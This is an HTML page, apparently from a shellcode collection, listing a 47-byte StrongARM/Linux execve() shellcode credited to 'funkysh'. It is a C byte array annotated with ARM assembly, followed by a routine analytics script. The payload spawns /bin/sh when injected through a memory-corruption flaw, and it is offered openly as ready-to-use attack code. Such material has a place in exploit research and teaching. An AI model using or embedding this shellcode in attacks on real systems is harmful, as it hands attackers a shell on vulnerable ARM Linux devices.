<html><head><title>StrongARM - execve() - 47 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
 * 47 byte StrongARM/Linux execve() shellcode
 * funkysh
 */

char shellcode[]= &quot;\x02\x20\x42\xe0&quot;   /*  sub   r2, r2, r2            */
                  &quot;\x1c\x30\x8f\xe2&quot;   /*  add   r3, pc, #28 (0x1c)    */
                  &quot;\x04\x30\x8d\xe5&quot;   /*  str   r3, [sp, #4]          */
                  &quot;\x08\x20\x8d\xe5&quot;   /*  str   r2, [sp, #8]          */
                  &quot;\x13\x02\xa0\xe1&quot;   /*  mov   r0, r3, lsl r2        */
                  &quot;\x07\x20\xc3\xe5&quot;   /*  strb  r2, [r3, #7           */
                  &quot;\x04\x30\x8f\xe2&quot;   /*  add   r3, pc, #4            */
                  &quot;\x04\x10\x8d\xe2&quot;   /*  add   r1, sp, #4            */
                  &quot;\x01\x20\xc3\xe5&quot;   /*  strb  r2, [r3, #1]          */
                  &quot;\x0b\x0b\x90\xef&quot;   /*  swi   0x90ff0b              */
                  &quot;/bin/sh&quot;;


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
